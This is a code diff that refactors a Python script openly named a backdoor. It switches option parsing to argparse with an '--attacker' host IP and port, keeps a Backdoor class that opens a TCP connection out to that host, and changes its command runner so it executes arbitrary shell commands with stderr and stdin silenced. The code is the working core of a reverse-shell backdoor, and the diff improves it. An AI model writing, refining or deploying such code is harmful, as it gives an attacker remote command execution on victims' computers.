@@ -7,25 +7,26 @@ import argparse
 import base64
 import socket
 import json
+import sys
 import os
 
 
 def get_arguments():
     """Get user supplied arguments from terminal."""
-    parser = optparse.OptionParser()
+    parser = argparse.ArgumentParser()
     # arguments
-    parser.add_option('-a', '--attacker', dest='attacker', help='Attacking host IP.')
-    parser.add_option('-p', '--port', dest='port', help='Port to connect to.')
+    parser.add_argument('-a', '--attacker', dest='attacker', help='Attacking host IP.')
+    parser.add_argument('-p', '--port', dest='port', help='Port to connect to.')
 
-    (options, arguments) = parser.parse_args()
+    (options) = parser.parse_args()
 
     return options
 
 
 class Backdoor:
     def __init__(self, ip, port):
-        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # IPv4 and TCP
-        self.connection.connect((ip, port))                                 # establishes connection
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)     # IPv4 and TCP
+        self.connection.connect((ip, port))                                     # establishes connection
 
 
     def reliable_send(self, data):
@@ -43,7 +44,7 @@ class Backdoor:
 
 
     def execute_system_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
 
     def change_working_directory(self, path):
